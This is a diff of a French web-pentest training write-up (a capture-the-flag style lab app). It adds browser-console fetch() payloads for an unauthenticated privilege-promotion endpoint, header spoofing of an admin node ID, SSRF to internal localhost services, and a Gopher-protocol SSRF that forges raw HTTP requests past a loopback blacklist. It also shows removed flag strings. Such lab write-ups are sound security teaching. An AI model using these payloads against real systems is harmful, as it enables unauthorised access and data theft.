+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> contournement total d'une restriction d'accès en changeant simplement le verbe HTTP.</p>
 <h3 id="8-endpoint-dadministration-sans-autorisation-blind-endpoint">8. Endpoint d'administration sans autorisation ("Blind" endpoint)<a class="headerlink" href="#8-endpoint-dadministration-sans-autorisation-blind-endpoint" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>POST /api/v2/promote</code><br />
-<strong>Constat :</strong> endpoint non lié dans l'interface, découvert via la fuite d'information du Challenge 6. Aucune vérification d'autorisation n'était appliquée : un appel POST vide suffisait à obtenir une élévation de privilèges pour le compte courant.<br />
-<strong>Impact :</strong> élévation de privilèges arbitraire, sans même nécessiter de connaître un rôle cible valide.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_8{BLIND_PROMOTION_SUCCESSFUL}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>POST /api/v2/promote</code>
+<strong>Constat :</strong> endpoint non lié dans l'interface, découvert via la fuite d'information du Challenge 6. Aucune vérification d'autorisation n'était appliquée : un appel POST vide suffisait à obtenir une élévation de privilèges pour le compte courant.</p>
+<p><strong>Commande (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/v2/promote&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({})</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="p">})</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> élévation de privilèges arbitraire, sans même nécessiter de connaître un rôle cible valide.</p>
 <h3 id="9-idor-via-header-http-personnalise">9. IDOR via header HTTP personnalisé<a class="headerlink" href="#9-idor-via-header-http-personnalise" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>GET /admin/control</code> (header <code>X-Decima-Node</code>)<br />
-<strong>Constat :</strong> l'autorisation d'une action critique (shutdown) reposait sur la valeur d'un header custom identifiant le node source, sans lien avec l'authentification de session. Le node légitime autorisé (<code>NODE-314</code>, appartenant au compte DIRECTOR) a été retrouvé dans les métadonnées du badge de cet utilisateur (cf. #2), permettant l'usurpation du header.<br />
-<strong>Impact :</strong> exécution d'une action administrative critique en falsifiant un identifiant de confiance transmis côté client.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_9{GOD_MODE_IDOR_VIA_HEADERS_COMPLETE}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>GET /admin/control</code> (header <code>X-Decima-Node</code>)
+<strong>Constat :</strong> l'autorisation d'une action critique (shutdown) reposait sur la valeur d'un header custom identifiant le node source, sans lien avec l'authentification de session. Le node légitime autorisé (<code>NODE-314</code>, appartenant au compte DIRECTOR) a été retrouvé dans les métadonnées du badge de cet utilisateur (cf. #2), permettant l'usurpation du header.</p>
+<p><strong>Commande (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/admin/control&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;X-Decima-Node&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;NODE-314&#39;</span><span class="w"> </span><span class="p">}</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="p">})</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> exécution d'une action administrative critique en falsifiant un identifiant de confiance transmis côté client.</p>
 <h3 id="10-ssrf-vers-un-service-interne-bypass-dautorisation">10. SSRF vers un service interne + bypass d'autorisation<a class="headerlink" href="#10-ssrf-vers-un-service-interne-bypass-dautorisation" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>POST /net/uptime</code> (<code>{"url": "..."}</code>)<br />
-<strong>Constat :</strong> l'outil de diagnostic effectue une requête serveur-side arbitraire vers l'URL fournie. La sortie par défaut (statut Apache) révélait elle-même l'existence d'un service de métriques interne non exposé publiquement (<code>localhost:8001/metrics</code>, commentaire "Internal Only"). Ce service exigeait un paramètre <code>node</code>, qui rejetait les formats invalides jusqu'à l'utilisation du node autorisé déjà identifié (<code>NODE-314</code>).<br />
-<strong>Impact :</strong> pivot réseau vers un service interne théoriquement inaccessible depuis l'extérieur, avec contournement de son propre contrôle d'autorisation.  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_10{SSRF_INTERNAL_PORT_AND_AUTH_BYPASS}</code></p>
-</details>
+<p><strong>Endpoint :</strong> <code>POST /net/uptime</code> (<code>{"url": "..."}</code>)
+<strong>Constat :</strong> l'outil de diagnostic effectue une requête serveur-side arbitraire vers l'URL fournie. La sortie par défaut (statut Apache) révélait elle-même l'existence d'un service de métriques interne non exposé publiquement (<code>localhost:8001/metrics</code>, commentaire "Internal Only"). Ce service exigeait un paramètre <code>node</code>, qui rejetait les formats invalides jusqu'à l'utilisation du node autorisé déjà identifié (<code>NODE-314</code>).</p>
+<p><strong>Commandes (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1">// Reconnaissance : révèle le service interne caché</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/net/uptime&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;http://127.0.0.1:5000/server-status&#39;</span><span class="w"> </span><span class="p">})</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="p">})</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="c1">// Pivot vers le service interne + bypass du contrôle &quot;node&quot;</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/net/uptime&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;http://localhost:8001/metrics?node=NODE-314&#39;</span><span class="w"> </span><span class="p">})</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="p">})</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> pivot réseau vers un service interne théoriquement inaccessible depuis l'extérieur, avec contournement de son propre contrôle d'autorisation.</p>
 <h3 id="11-ssrf-avec-bypass-de-blacklist-forge-de-requete-http-protocole-gopher">11. SSRF avec bypass de blacklist + forge de requête HTTP (protocole Gopher)<a class="headerlink" href="#11-ssrf-avec-bypass-de-blacklist-forge-de-requete-http-protocole-gopher" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>POST /net/scraper</code> (<code>{"url": "..."}</code>)<br />
+<p><strong>Endpoint :</strong> <code>POST /net/scraper</code> (<code>{"url": "..."}</code>)
 <strong>Constat en deux temps :</strong>
 - La blacklist de loopback (<code>127.0.0.1</code>, <code>localhost</code>) était contournée par la représentation alternative <code>0.0.0.0</code>, équivalente réseau mais absente du filtre textuel.
-- Le service cible exigeait un <code>User-Agent</code> précis (<code>DecimaBot/1.0</code>), non modifiable via les champs JSON exposés par l'API. Le protocole <strong>Gopher</strong> (<code>gopher://host:port/_&lt;requête_HTTP_brute_encodée&gt;</code>) a permis de forger une requête HTTP complète, headers inclus, exploitée nativement par <code>curl</code> en arrière-plan.</p>
-<p><strong>Point méthodologique :</strong> face à un outil SSRF qui ne permet de contrôler qu'une URL sans en-têtes, le protocole Gopher est le vecteur de référence pour injecter des données brutes (requêtes HTTP, commandes Redis/Memcached, etc.) dans un flux TCP arbitraire.<br />
-<strong>Impact :</strong> exfiltration de données internes en contournant simultanément un filtre réseau et un contrôle applicatif (validation de header).  </p>
-<details class="success">
-<summary>Réponse / Flag</summary>
-<p><code>FLAG_11{GOPHER_PROTOCOL_HEADER_FORGERY}</code></p>
-</details>
-<h3 id="bonus-endpoint-cache-non-lie-dans-linterface">Bonus - Endpoint caché non lié dans l'interface<a class="headerlink" href="#bonus-endpoint-cache-non-lie-dans-linterface" title="Permanent link">&para;</a></h3>
-<p><strong>Endpoint :</strong> <code>GET /interface/core</code><br />
-<strong>Constat :</strong> page complètement absente du menu de navigation, découverte par brute-force manuel de chemins probables (<code>/interface/core</code>), sans dépendance aux challenges précédents.  </p>
-<details class="success">
-<summary>Réponse / Flag bonus</summary>
-<p><code>BONUS{Y0U_4R3_B31NG_W4TCH3D}</code></p>
-</details>
+- Le service cible exigeait un <code>User-Agent</code> précis (<code>DecimaBot/1.0</code>), non modifiable via les champs JSON exposés par l'API. Le protocole <strong>Gopher</strong> (<code>gopher://host:port/_&lt;requête_HTTP_brute_encodée&gt;</code>) a permis de forger une requête HTTP complète, headers inclus, exploitée nativement par <code>curl</code> en arrière-plan.
+<strong>Point méthodologique :</strong> face à un outil SSRF qui ne permet de contrôler qu'une URL sans en-têtes, le protocole Gopher est le vecteur de référence pour injecter des données brutes (requêtes HTTP, commandes Redis/Memcached, etc.) dans un flux TCP arbitraire.</p>
+<p><strong>Commande (console) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">rawRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;GET /internal/reward HTTP/1.1\r\nHost: 0.0.0.0:5000\r\nUser-Agent: DecimaBot/1.0\r\n\r\n&quot;</span><span class="p">;</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gopherUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;gopher://0.0.0.0:5000/_&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">rawRequest</span><span class="p">);</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/net/scraper&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="nx">gopherUrl</span><span class="w"> </span><span class="p">})</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="p">})</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></p>
+<p><strong>Impact :</strong> exfiltration de données internes en contournant simultanément un filtre réseau et un contrôle applicatif (validation de header).</p>
+<h3 id="bonus-endpoint-cache-non-lie-dans-linterface">Bonus — Endpoint caché non lié dans l'interface<a class="headerlink" href="#bonus-endpoint-cache-non-lie-dans-linterface" title="Permanent link">&para;</a></h3>
+<p><strong>Endpoint :</strong> <code>GET /interface/core</code>
+<strong>Constat :</strong> page complètement absente du menu de navigation, découverte par brute-force manuel de chemins probables sans dépendance aux challenges précédents.</p>
+<p><strong>Commande (barre d'adresse) :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>http://localhost:5000/interface/core
+</code></pre></div></p>
 <hr />
 <h2 id="enseignements-methodologiques-reutilisables">Enseignements méthodologiques réutilisables<a class="headerlink" href="#enseignements-methodologiques-reutilisables" title="Permanent link">&para;</a></h2>
 <table>
@@ -1606,7 +1665,7 @@
 <td>Tester l'envoi direct de la requête sans passer par le formulaire</td>
 </tr>
 <tr>
-<td>Le message d'erreur change entre deux tentatives (404 -&gt; 401 -&gt; 403 -&gt; 200)</td>
+<td>Le message d'erreur change entre deux tentatives (404 → 401 → 403 → 200)</td>
 <td>Progression réelle, pas un mur fixe</td>
 <td>Continuer d'itérer sur cette piste plutôt que d'en changer</td>
 </tr>
@@ -1642,8 +1701,6 @@
 </tr>
 </tbody>
 </table>
-<hr />
-<p><em>Document produit dans le cadre du module Jedha Cyber Lead - Pentest Web (Grey Box), Samaritan Core Interface. À intégrer à la bibliothèque de méthodologie personnelle (HIVE).</em></p>
 
 
 
